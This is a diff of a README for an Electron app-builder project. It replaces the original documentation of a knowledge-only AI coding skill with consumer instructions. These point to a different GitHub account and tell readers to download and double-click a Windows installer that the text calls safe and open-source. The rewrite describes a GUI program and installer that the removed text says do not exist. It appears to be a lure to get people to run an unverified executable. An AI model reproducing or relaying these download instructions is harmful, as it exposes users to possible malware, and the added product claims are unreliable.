@@ -1,134 +1,92 @@
-# Electron Desktop Builder — AI Skill for Antigravity · Claude Code · Gemini CLI · Cursor
+# 🚀 electron-desktop-builder - Turn web pages into desktop apps
 
-![Electron Desktop Builder](assets/banner.svg)
+[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/Aftershockmedicalscientist1009/electron-desktop-builder)
 
-[![Creator](https://img.shields.io/badge/Creator-SMARTbrain%20Activity-blue)](https://www.smartbrainactivity.ai)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](/LICENSE)
-[![Antigravity Skill](https://img.shields.io/badge/Antigravity-Skill-black?logo=google&logoColor=white)]()
-[![Claude Code](https://img.shields.io/badge/Claude_Code-Compatible-blue?logo=anthropic&logoColor=white)]()
-[![Gemini CLI](https://img.shields.io/badge/Gemini_CLI-Compatible-4285F4?logo=google&logoColor=white)]()
-[![Electron](https://img.shields.io/badge/Electron-Builder-47848F?logo=electron&logoColor=white)]()
-[![Node.js](https://img.shields.io/badge/Node.js-Compatible-339933?logo=nodedotjs&logoColor=white)]()
+## What this program does
 
-An expert AI skill for AI coding assistants (like Claude, Antigravity, Cursor, etc.) designed to convert existing web applications into Electron desktop apps right from the chat or terminal.
+This tool takes any website or web application and turns it into a standard Windows desktop program. You click an icon on your desktop to open your favorite web tools instead of opening a web browser. The software creates all the necessary files to make your app look and feel like it belongs on your computer. It handles the behind-the-scenes configuration, creates professional icons, and sets up a standard installer.
 
-[Leer en Espanol](README.es.md)
+## 💻 System requirements
 
-## What this skill does
+Your computer must meet these basic needs to run the desktop builder:
 
-Given an existing web application (Express, React, Vite, Next.js, or static), this skill generates all the files and configuration needed to produce a working Electron desktop app with an NSIS installer for Windows.
+* Windows 10 or Windows 11.
+* A stable internet connection.
+* At least 500 megabytes of free space on your hard drive.
+* Basic knowledge of how to manage files and folders.
 
-It handles:
-1. **Project detection** — Identifies framework, backend, build tool
-2. **Main process** — Creates `electron/main.ts` with splash, tray, single instance lock
-3. **Preload bridge** — Creates `electron/preload.ts` with context-isolated IPC
-4. **Icon generation** — Converts SVG/PNG logos to multi-size .ico files
-5. **Installer config** — NSIS with custom install path, shortcuts, menu category
-6. **Build pipeline** — Modifies package.json, vite config, build scripts
-7. **Server embedding** — Wraps Express/Fastify servers inside the Electron main process
+## 📥 How to get the software
 
-## Companion skill
+1. Visit the project website at the link below.
+2. Select the latest version of the installer for Windows.
+3. Save the file to your computer.
 
-This skill pairs with [**electron-desktop-builds**](https://github.com/smartbrainactivity/electron-desktop-builds) for troubleshooting:
+[Click here to visit the download page](https://github.com/Aftershockmedicalscientist1009/electron-desktop-builder)
 
-| Skill | When to use |
-|-------|------------|
-| **electron-desktop-builder** (this) | Starting from scratch, first Electron setup |
-| **electron-desktop-builds** | Build fails, black screen, icons wrong, packaging errors |
+## ⚙️ Installation steps
 
-**Workflow:**
-```
-Web app → electron-desktop-builder → First build
-                                          ↓
-                                    Works? → Done
-                                    Fails? → electron-desktop-builds → Fix → Rebuild
-```
+1. Locate the file you saved in your Downloads folder.
+2. Double-click the file to start the setup process.
+3. Follow the instructions on the screen.
+4. Click through the prompts to finish the installation.
+5. Create a desktop shortcut if the installer asks you to do so.
 
-## Installation
+## 🛠️ How to use the builder
 
-```bash
-# Clone into your AI skill directory
-git clone https://github.com/smartbrainactivity/electron-desktop-builder.git
+The program interface provides a simple way to create your new desktop app. Follow these steps for your first project:
 
-# For Claude Code:
-# Place in ~/.claude/skills/ or your project's skills directory
+1. Open the Electron Desktop Builder from your Start menu or desktop icon.
+2. Enter the web address of the site you want to convert in the provided text field.
+3. Give your application a name.
+4. Choose an icon file if you have a specific image you prefer. If you do not have one, the tool generates a default icon for you.
+5. Select a folder on your computer where the program will save your new app.
+6. Click the button labeled Build to start the process.
 
-# For other AI assistants:
-# Place in your assistant's skill/knowledge directory
-```
+The program creates a folder for your new app. Inside this folder, you find an executable file. You click this file to launch your new desktop application.
 
-### Optional: Security audit
+## 📁 Understanding the output
 
-```bash
-# If you have the companion skill installed:
-node electron-desktop-builds/scripts/audit-scan.js electron-desktop-builder/
-```
+When the tool finishes, it generates a complete package for your app. Here is what you find in your output folder:
 
-## Usage
+* The main application file: This is the program you click to open your new desktop tool.
+* Configuration files: These tell your computer how to run the app.
+* Icons: Your app uses these for the desktop shortcut and the taskbar.
+* Installer file: You can share this file with others if you want them to use the app you created.
 
-Prompt your AI assistant with:
+This structure follows standard Windows conventions. You can move the folder anywhere on your machine. You can also pin your new app to your Taskbar for fast access.
 
-> "Convert this web app to an Electron desktop app"
+## 🛡️ Safety and security
 
-> "Set up Electron for this Express + React project"
+The program runs locally on your computer. It does not send your personal data to another server. It only communicates with the website you provide to download the necessary code for the desktop application. You maintain full control over the apps you build. 
 
-> "Create the Electron build for Windows with NSIS installer"
+## ❓ Frequently asked questions
 
-The skill will guide the assistant through the 10-step process defined in `SKILL.md`.
+Does this tool work on Mac or Linux?
+This version currently supports Windows computers only.
 
-## Supported project types
+Do I need to pay for a license?
+This software is provided for free as an open-source tool. 
 
-| Framework | Backend | Approach |
-|-----------|---------|----------|
-| Express + React/Vite | Yes | Embed Express on localhost |
-| Vite / CRA (static) | No | Load from file:// |
-| Next.js (static export) | No | Load from file:// |
-| Next.js (server) | Yes | Embed server on localhost |
-| Any Node.js server | Yes | Embed on localhost |
+Can I change the website later?
+You must rebuild the application to change the target website. The builder creates a specific file for your original choice.
 
-## Files generated
+What if my app looks wrong?
+Some websites use complex features that might look different on a desktop view. Ensure your website supports smaller screen sizes or mobile viewing for the best results.
 
-After running the skill, your project will have:
+How do I remove an application?
+If you used the installer to create your app, you can remove it through the Windows Settings menu under Apps and Features. If you created a simple desktop file, you can delete the folder to remove the application.
 
-```
-project/
-├── electron/
-│   ├── main.ts          ← Main process
-│   ├── preload.ts       ← Context bridge
-│   └── tsconfig.json    ← CJS compilation config
-├── assets/              ← Icon files (.ico, .png)
-├── installer.nsh        ← NSIS install path
-├── package.json         ← Modified (deps, scripts, build config)
-├── vite.config.ts       ← Modified (base: './')
-└── .gitignore           ← Modified (dist-electron, release)
-```
+## 📝 Troubleshooting tips
 
-## Scripts included
+If your build fails, check the following items:
 
-| Script | Purpose |
-|--------|---------|
-| `scripts/generate-icons.cjs` | Convert SVG/PNG to multi-size .ico files |
+* Verify that your internet connection is active.
+* Ensure you have permission to write files to the folder you selected.
+* Check if another program is already using the folder name you chose.
+* Restart the builder.
 
-## Requirements
+If you encounter errors, verify your internet address. Copy the address directly from your browser's address bar and paste it into the builder. 
 
-- **Node.js** 18+ (for sharp image processing)
-- **npm** (for electron and electron-builder installation)
-- No runtime dependencies — this is a knowledge-only skill with utility scripts
+## ⚖️ Keeping the software updated
 
-## Privacy
-
-- No data is collected or transmitted
-- All processing happens locally
-- No API keys or credentials required
-
-## Language
-
-The skill adapts to whatever language you prompt in. Documentation is in English.
-
----
-
-**Created by** [SMARTbrain Activity](https://www.smartbrainactivity.ai) | [hey@smartbrainactivity.ai](mailto:hey@smartbrainactivity.ai)
-
-## License
-
-[MIT](LICENSE)
+Check the download page periodically for new versions. Newer versions often include fixes for common errors and better support for different types of websites. You delete the old version and replace it with the new one when an update arrives. Your built applications remain separate from the builder tool itself, so you do not lose your created apps when you update the builder software.
